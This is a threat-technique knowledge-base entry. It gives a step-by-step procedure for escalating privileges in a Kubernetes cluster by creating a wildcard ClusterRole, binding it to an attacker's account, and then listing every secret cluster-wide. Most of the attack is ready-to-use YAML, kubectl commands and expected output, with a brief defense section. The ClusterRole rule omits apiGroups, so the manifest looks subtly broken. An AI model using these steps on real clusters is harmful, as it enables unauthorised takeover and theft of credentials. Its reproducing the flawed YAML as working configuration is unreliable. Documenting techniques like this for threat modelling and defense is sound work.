---
type: procedure
description: >-
  Modify Kubernetes RBAC configuration to grant access to all resources and
  verbs, enabling full cluster control.
verified: true
submitted: false
created_at: '2023-04-06T03:56:01.229469+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[Privilege Escalation]]'
techniques:
  - '[[Valid Accounts]]'
  - '[[T1078.004]]'
sub_techniques: []
tags:
  - '[[tags/Kubernetes]]'
  - '[[tags/RBAC Configuration]]'
  - '[[tags/Privilege Escalation]]'
  - '[[tags/Access Any Resource or Verb]]'
commands:
  - '[[commands/kubectl-apply-rbac-wildcard]]'
tools:
  - '[[tools/kubectl]]'
platforms:
  - Kubernetes
validated: true
---

# Modify-Kubernetes-RBAC-for-Wildcard-Access

## Summary

This procedure demonstrates how an attacker with initial access to the Kubernetes API can modify Role-Based Access Control (RBAC) configurations to grant wildcard permissions, allowing access to any resource (e.g., pods, secrets, deployments) with any verb (e.g., get, create, delete). This enables full control over the cluster, such as deploying malicious containers or exfiltrating sensitive data. It assumes the attacker has sufficient privileges to create or edit roles/clusterroles.

## Description

In Kubernetes, RBAC controls access through roles and bindings. An attacker exploiting weak initial permissions or an API server vulnerability can create a new ClusterRole with wildcard rules (resources: '*', verbs: '*') and bind it to their service account or user. This technique abuses valid accounts to escalate privileges across the cluster. It targets environments with misconfigured RBAC where service accounts have create/update permissions on roles. Success grants omniscient and omnipotent access, bypassing least-privilege principles.

## Requirements

1. Access to kubectl with a service account or user token that has permissions to create or update ClusterRoles and ClusterRoleBindings (e.g., via initial pod escape or API exploitation).
2. Kubernetes cluster version 1.6+ with RBAC enabled.
3. Network connectivity to the Kubernetes API server (usually port 6443).
4. Tools: kubectl installed and configured with cluster credentials.

## Defense

- Implement principle of least privilege: Service accounts should only have necessary RBAC permissions; avoid broad create/update on roles.
- Enable and monitor Kubernetes audit logs for RBAC modifications (e.g., create clusterrole events).
- Use tools like OPA Gatekeeper or Kyverno to enforce RBAC policies and prevent wildcard rules.
- Regularly audit RBAC configurations with 'kubectl auth can-i' and tools like kube-bench.
- Rotate credentials and use network policies to restrict API server access.

## Objectives

1. Create or modify a ClusterRole with wildcard access to all resources and verbs.
2. Bind the role to the attacker's service account for escalated privileges.
3. Verify full cluster access by performing restricted actions (e.g., listing secrets).

## Instructions

### Step 1: Prepare the RBAC Wildcard Configuration

**Context**: Define the YAML snippet for the RBAC rules that grant access to all resources with all verbs. This snippet will be embedded in a full ClusterRole YAML file. Use the provided code snippet [[codes/RBAC-Wildcard-Rules-YAML]] to construct the configuration.

Create a file named `wildcard-clusterrole.yaml` with the following structure, inserting the wildcard rules:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: wildcard-clusterrole
rules:
- resources:
  - '*'
  verbs:
  - '*'
---
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding
metadata:
  name: wildcard-binding
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: ClusterRole
  name: wildcard-clusterrole
subjects:
- kind: User
  name: attacker-user  # Replace with actual user or service account
  apiGroup: rbac.authorization.k8s.io
```

> This creates a ClusterRole with full permissions and binds it to the specified subject. Adjust the subject to match the attacker's identity (e.g., service account name).

**Expected Output**: A valid YAML file ready for application, verifiable with `kubectl apply --dry-run=client -f wildcard-clusterrole.yaml` showing no errors.

### Step 2: Apply the RBAC Configuration

**Context**: Use kubectl to apply the wildcard RBAC configuration to the cluster, creating the role and binding.

**Command** ([[commands/kubectl-apply-rbac-wildcard]]):
```bash
kubectl apply -f wildcard-clusterrole.yaml
```

> This command deploys the ClusterRole and ClusterRoleBinding. If the role already exists, it will update it. Monitor for errors related to insufficient permissions.

**Expected Output**:
```
clusterrole.rbac.authorization.k8s.io/wildcard-clusterrole created
clusterrolebinding.rbac.authorization.k8s.io/wildcard-binding created
```

### Step 3: Verify Escalated Access

**Context**: Test the new permissions to confirm wildcard access has been granted. Attempt actions that were previously restricted, such as listing all secrets cluster-wide.

Run the following to check permissions:
```bash
kubectl auth can-i '*' '*' --all-namespaces
```

> This verifies the attacker can now perform any verb on any resource.

**Expected Output**:
```
Yes
```

Then, demonstrate access by listing sensitive resources:
```bash
kubectl get secrets --all-namespaces
```

**Expected Output**: A list of all secrets across namespaces, including potentially sensitive ones like kubeconfig or tokens.
